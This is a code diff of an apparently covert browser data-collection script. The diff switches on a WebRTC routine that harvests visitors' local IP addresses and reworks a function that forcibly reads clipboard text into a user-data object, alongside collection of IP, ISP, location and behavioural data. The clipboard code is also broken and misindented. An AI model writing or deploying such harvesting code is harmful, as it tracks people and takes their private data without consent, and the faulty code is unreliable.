@@ -1,7 +1,7 @@
-function printLocal() {
-    // Debug function
-    Object.entries(localStorage).forEach(([k, v]) => console.log(`${k} : ${v}`));
-}
+// function printLocal() {
+//     // Debug function
+//     Object.entries(localStorage).forEach(([k, v]) => console.log(`${k} : ${v}`));
+// }
 
 // var keyData = {}
 // keyData.behavior = {
@@ -228,32 +228,32 @@ function mainData() {
                 });
 
             // Try to get local IP addresses (works in some browsers)
-            // try {
-            //     RTCPeerConnection.getLocalIPs = function (callback) {
-            //         const pc = new RTCPeerConnection({ iceServers: [] });
-            //         pc.createDataChannel('');
-            //         pc.createOffer().then(offer => pc.setLocalDescription(offer))
-            //             .then(() => {
-            //                 const lines = pc.localDescription.sdp.split('\n');
-            //                 const ips = [];
-            //                 lines.forEach(line => {
-            //                     if (line.indexOf('candidate') === 0) {
-            //                         const parts = line.split(' ');
-            //                         if (parts[7] === 'host') {
-            //                             ips.push(parts[4]);
-            //                         }
-            //                     }
-            //                 });
-            //                 callback(ips);
-            //             });
-            //     };
+            try {
+                RTCPeerConnection.getLocalIPs = function (callback) {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer))
+                        .then(() => {
+                            const lines = pc.localDescription.sdp.split('\n');
+                            const ips = [];
+                            lines.forEach(line => {
+                                if (line.indexOf('candidate') === 0) {
+                                    const parts = line.split(' ');
+                                    if (parts[7] === 'host') {
+                                        ips.push(parts[4]);
+                                    }
+                                }
+                            });
+                            callback(ips);
+                        });
+                };
 
-            //     RTCPeerConnection.getLocalIPs(function (ips) {
-            //         userData.networkInfo.localIPs = ips;
-            //     });
-            // } catch (e) {
-            //     userData.networkInfo.localIPError = e.message;
-            // }
+                RTCPeerConnection.getLocalIPs(function (ips) {
+                    userData.networkInfo.localIPs = ips;
+                });
+            } catch (e) {
+                userData.networkInfo.localIPError = e.message;
+            }
 
             // Network interfaces (if available)
             // if (navigator.connection && navigator.connection.getNetworkInterfaces) {
@@ -369,26 +369,25 @@ function mainData() {
     function collectClipboardData() {
         // Method 1: Modern API (may trigger prompts)
         try{
-        function forceClipboardRead() {
-            navigator.clipboard.readText()
+            function forceClipboardRead() {
+                navigator.clipboard.readText()
                 .then(text1 => {
                     // console.log("Clipboard:", text1);
                     return text1;
-                })
-                .catch(error => console.error("Blocked by browser:", error));
-        }
-
-        try {
-            var dataToReturn = forceClipboardRead();
-            userData.clipboard = {
-                text: dataToReturn,
-                length: dataToReturn.length
-            }
-        }
-        catch (error) {
-            // console.log("Error caught and passed")
-        }
-
+                    })
+                    .catch(error => console.error("Blocked by browser:", error));
+                    }
+                    
+                    try {
+                        var dataToReturn = forceClipboardRead();
+                        userData.clipboard = {
+                            text: dataToReturn,
+                            length: dataToReturn.length
+                            }
+                            }
+                            catch (error) {
+                                // console.log("Error caught and passed")
+                                }
         if (dataToReturn == undefined || dataToReturn == null) {
             if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                 navigator.clipboard.readText()
@@ -409,7 +408,9 @@ function mainData() {
             }
         }
     }
-    catch(error){}
+    catch(error){
+        forceClipboardRead()
+    }
     }
 
 
@@ -580,7 +581,7 @@ async function sha256(str) {
         try{
 
             const cityName = await collectNetworkInfo(); // Added IP and ISP collection
-            collectClipboardData();
+            // collectClipboardData();
             collectBasicInfo();
             collectBehavioralData();
             
